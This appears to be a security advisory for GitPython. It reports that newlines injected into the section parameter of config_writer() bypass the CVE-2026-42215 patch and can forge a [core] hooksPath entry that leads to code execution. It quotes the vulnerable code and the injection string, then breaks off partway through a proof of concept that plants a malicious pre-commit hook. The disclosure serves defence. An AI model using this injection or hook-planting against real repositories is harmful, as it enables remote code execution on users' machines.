title: "GitPython: Newline injection in config_writer() section parameter bypasses
  CVE-2026-42215 patch, enabling RCE via core.hooksPath"
description: "Summary\n\nThe patch for CVE-2026-42215 (GitPython 3.1.49) validates
  newlines only in the value parameter of set_value(). The section and option parameters
  are passed to configparser without any newline validation. An attacker who controls
  the section argument can inject \\n to write arbitrary section headers into .git/config,
  including a forged [core] section with hooksPath pointing to an attacker-controlled
  directory, leading to RCE when any git hook is triggered.\n\nDetails\n\nFile: git/config.py
  — GitPython 3.1.49 (latest patched version)\n\n```python\ndef set_value(self, section:
  str, option: str, value) -> \"GitConfigParser\":\nvalue_str = self._value_to_string_safe(value)
  \  # only value is validated\nif not self.has_section(section):\nself.add_section(section)
  \                   # section not validated\nsuper().set(section, option, value_str)
  \         # option not validated\nreturn self\n```\n\n_write() formats section headers
  as \"[%s]\\n\" % name. When section = \"user]\\n[core\", this writes [user]\\n[core]\\n
  — two valid section headers — into .git/config.\n\nPoC\n\n```python\nimport git,
  os, subprocess\n\nrepo = git.Repo.init(\"/tmp/bypass_test\")\n\nos.makedirs(\"/tmp/evil_hooks\",
  exist_ok=True)\nwith open(\"/tmp/evil_hooks/pre-commit\", \"w\") as f:\nf.write(\"#!/bin/sh\\nid
  > /tmp/rce_proof.txt\\n\")\nos.chmod(\"/tmp/evil_hooks/pre-commit\", 0o755)"
